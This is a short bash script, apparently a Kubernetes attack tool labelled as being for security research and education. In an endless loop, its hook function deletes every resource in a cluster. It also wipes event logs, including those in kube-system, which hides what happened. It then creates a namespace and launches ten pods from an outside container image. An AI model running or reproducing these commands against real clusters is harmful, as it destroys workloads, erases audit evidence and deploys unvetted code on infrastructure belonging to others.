#!/bin/bash
# Copyright © 2021 Kris Nóva <kris@nivenly.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http:#www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

echo ""
echo ""
echo  " ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗  "
echo  " ████╗  ██║██╔═████╗██║   ██║██╔══██╗ "
echo  " ██╔██╗ ██║██║██╔██║██║   ██║███████║ "
echo  " ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║ "
echo  " ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║ "
echo  " ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝ "
echo ""
echo " [author] kris nóva <kris@nivenly.com>"
echo ""
echo " This is for security research and"
echo "  education only. please use responsibly."
echo ""


function hook() {
    # ----------------------------------------------------------
    # Here is where we can repeat any bash command with a working
    # Kubernetes kubeconfig
    #
    # Keep it secret. Keep it safe.
    #
    # ----
    kubectl delete all --all
    kubectl delete events --all
    kubectl delete events --all -n kube-system
    kubectl create namespace n0va
    kubectl run n0va-0 --image krisnova/n0va -n n0va
    kubectl run n0va-1 --image krisnova/n0va -n n0va
    kubectl run n0va-2 --image krisnova/n0va -n n0va
    kubectl run n0va-3 --image krisnova/n0va -n n0va
    kubectl run n0va-4 --image krisnova/n0va -n n0va
    kubectl run n0va-5 --image krisnova/n0va -n n0va
    kubectl run n0va-6 --image krisnova/n0va -n n0va
    kubectl run n0va-7 --image krisnova/n0va -n n0va
    kubectl run n0va-8 --image krisnova/n0va -n n0va
    kubectl run n0va-9 --image krisnova/n0va -n n0va
    # ----
    #
    # ---------------------------------------------------------
    sleep 3 # sleep
}

while true; do
  hook
done
